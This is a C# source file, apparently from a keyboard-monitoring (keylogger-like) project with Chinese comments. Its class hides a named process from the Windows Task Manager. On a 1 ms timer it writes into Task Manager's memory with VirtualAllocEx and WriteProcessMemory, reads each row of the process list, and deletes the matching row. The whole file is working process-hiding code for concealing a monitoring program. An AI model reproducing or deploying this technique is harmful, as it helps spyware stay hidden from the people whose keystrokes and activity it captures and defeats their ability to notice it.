
#define HideTaskmgsList_Start

using KeyboardMonitor.API;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

//


namespace KeyboardMonitor.Common
{
	/// <summary>
	/// 隐藏任务管理器列表
	/// </summary>
	public class HideTaskmgrList
	{
		private System.Timers.Timer m_Time = new System.Timers.Timer();
		private string m_ProcessName = "";
		private int m_ProcessID = 0;
		/// <summary>   
		/// 进程名称   
		/// </summary>   
		public string ProcessName { get { return m_ProcessName; } set { m_ProcessName = value; } }
		/// <summary>   
		/// 开始   
		/// </summary>   
		[Conditional("HideTaskmgsList_Start")]
		public void Start()
		{
			m_Time.Enabled = true;
		}
		/// <summary>   
		/// 停止   
		/// </summary>   
		public void Stop()
		{
			m_Time.Enabled = false;
		}
		public HideTaskmgrList()
		{
			m_Time.Interval = 1;
			m_Time.Elapsed += new System.Timers.ElapsedEventHandler(_Time_Elapsed);
		}
		void _Time_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
			HideTaskmgrListOfName(m_ProcessName);
		}
		/// <summary>   
		/// 获取所有控件   
		/// </summary>   
		/// <param name="p_Handle"></param>   
		/// <param name="p_Param"></param>   
		/// <returns></returns>   
		private bool NetEnumControl(IntPtr p_Handle, int p_Param)
		{
			Win32.STRINGBUFFER _TextString = new Win32.STRINGBUFFER();
			Win32.GetWindowText(p_Handle, out _TextString, 256);
			Win32.STRINGBUFFER _ClassName = new Win32.STRINGBUFFER();
			Win32.GetClassName(p_Handle, out _ClassName, 255);
			if (_TextString.szText == "进程" && _ClassName.szText == "SysListView32")
			{
				Hide(p_Handle);
				return false;
			}
			return true;
		}
		/// <summary>   
		/// 隐藏   
		/// </summary>   
		/// <param name="p_ListViewIntPtr"></param>   
		public void Hide(IntPtr p_ListViewIntPtr)
		{
			IntPtr _ControlIntPtr = p_ListViewIntPtr;
			int _ItemCount = Win32.SendMessage(p_ListViewIntPtr, 0x1004, 0, 0);
			Win32.ProcessAccessType _Type;
			_Type = Win32.ProcessAccessType.PROCESS_VM_OPERATION | Win32.ProcessAccessType.PROCESS_VM_READ | Win32.ProcessAccessType.PROCESS_VM_WRITE;
			IntPtr _ProcessIntPtr = Win32.OpenProcess(_Type, 1, (uint)m_ProcessID);
			IntPtr _Out = IntPtr.Zero;
			for (int z = 0; z != _ItemCount; z++)
			{
				//分配一个内存地址 保存进程的应用程序名称   
				IntPtr _StrBufferMemory = Win32.VirtualAllocEx(_ProcessIntPtr, 0, 255, Win32.MEM_COMMIT.MEM_COMMIT, Win32.MEM_PAGE.PAGE_READWRITE);
				byte[] _OutBytes = new byte[40]; //定义结构体 (LVITEM)  
				byte[] _StrIntPtrAddress = BitConverter.GetBytes(_StrBufferMemory.ToInt32());
				_OutBytes[20] = _StrIntPtrAddress[0];
				_OutBytes[21] = _StrIntPtrAddress[1];
				_OutBytes[22] = _StrIntPtrAddress[2];
				_OutBytes[23] = _StrIntPtrAddress[3];
				_OutBytes[24] = 255;
				//给结构体分配内存   
				IntPtr _Memory = Win32.VirtualAllocEx(_ProcessIntPtr, 0, _OutBytes.Length, Win32.MEM_COMMIT.MEM_COMMIT, Win32.MEM_PAGE.PAGE_READWRITE);
				//把数据传递给结构体 (LVITEM)   
				Win32.WriteProcessMemory(_ProcessIntPtr, _Memory, _OutBytes, (uint)_OutBytes.Length, out _Out);
				//发送消息获取结构体数据   
				Win32.SendMessage(p_ListViewIntPtr, 0x102D, z, _Memory);
				//获取结构体数据   
				Win32.ReadProcessMemory(_ProcessIntPtr, _Memory, _OutBytes, (uint)_OutBytes.Length, out _Out);
				//获取结构体 pszText的地址   
				IntPtr _ValueIntPtr = new IntPtr(BitConverter.ToInt32(_OutBytes, 20));
				byte[] _TextBytes = new byte[255]; //获取pszText的数据   
				Win32.ReadProcessMemory(_ProcessIntPtr, _ValueIntPtr, _TextBytes, 255, out _Out);
				//获取进程名称   
				string _ProcessText = System.Text.Encoding.Default.GetString(_TextBytes).Trim(new Char[] { '\0' });
				//释放内存   
				Win32.VirtualFreeEx(_ProcessIntPtr, _StrBufferMemory, 0, Win32.MEM_COMMIT.MEM_RELEASE);
				Win32.VirtualFreeEx(_ProcessIntPtr, _Memory, 0, Win32.MEM_COMMIT.MEM_RELEASE);
				if (_ProcessText == m_ProcessName)
				{
					Win32.SendMessage(p_ListViewIntPtr, 0x1008, z, 0);
				}
			}
		}
		/// <summary>   
		/// 在WINDOWS任务管理器里隐藏一行 需要一直调用 会被任务管理器刷新出来   
		/// </summary>   
		/// <param name="p_Name">名称 如QQ.exe</param>   
		public void HideTaskmgrListOfName(string p_Name)
		{
			System.Diagnostics.Process[] _ProcessList = System.Diagnostics.Process.GetProcessesByName("taskmgr");
			for (int i = 0; i != _ProcessList.Length; i++)
			{
				if (_ProcessList[i].MainWindowTitle.Contains("任务管理器"))
				{
					m_ProcessID = _ProcessList[i].Id;
					Win32.EnumWindowsProc _EunmControl = new Win32.EnumWindowsProc(NetEnumControl);
					Win32.EnumChildWindows(_ProcessList[i].MainWindowHandle, _EunmControl, 0);
				}
			}
		}
	}
}
